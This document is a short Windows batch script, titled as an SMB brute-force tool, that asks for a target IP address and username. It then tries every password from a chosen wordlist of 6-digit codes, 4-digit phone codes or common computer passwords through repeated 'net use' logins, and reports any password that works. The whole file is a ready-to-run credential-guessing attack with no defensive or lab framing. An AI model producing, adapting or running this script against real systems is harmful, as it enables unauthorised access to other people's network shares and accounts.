@echo off
title SMB Bruteforce - by Shahim Alabdi
color A
echo.

set /p ip="Enter IP Address: "
set /p user="Enter Username: "

echo.
echo Select Password Type:
echo 1 - 6 Digit Phone Password
echo 2 - 4 Digit Phone Password
echo 3 - Computer Passwords
set /p choice="Enter choice (1/2/3): "

if "%choice%"=="1" set wordlist=numbers_6digit.txt
if "%choice%"=="2" set wordlist=phone_passlist.txt
if "%choice%"=="3" set wordlist=passlist.txt

if not defined wordlist (
    echo Invalid choice.
    pause
    exit
)

if not exist %wordlist% (
    echo Wordlist file not found!
    pause
    exit
)

set /a count=1
for /f %%a in (%wordlist%) do (
    set pass=%%a
    call :attempt
)

echo Password not Found :(
pause
exit

:success
echo.
echo Password Found! %pass%
net use \\%ip% /d /y >nul 2>&1
pause
exit

:attempt
net use \\%ip% /user:%user% %pass% >nul 2>&1
echo [ATTEMPT %count%] [%pass%]
set /a count=%count%+1
if %errorlevel% EQU 0 goto success
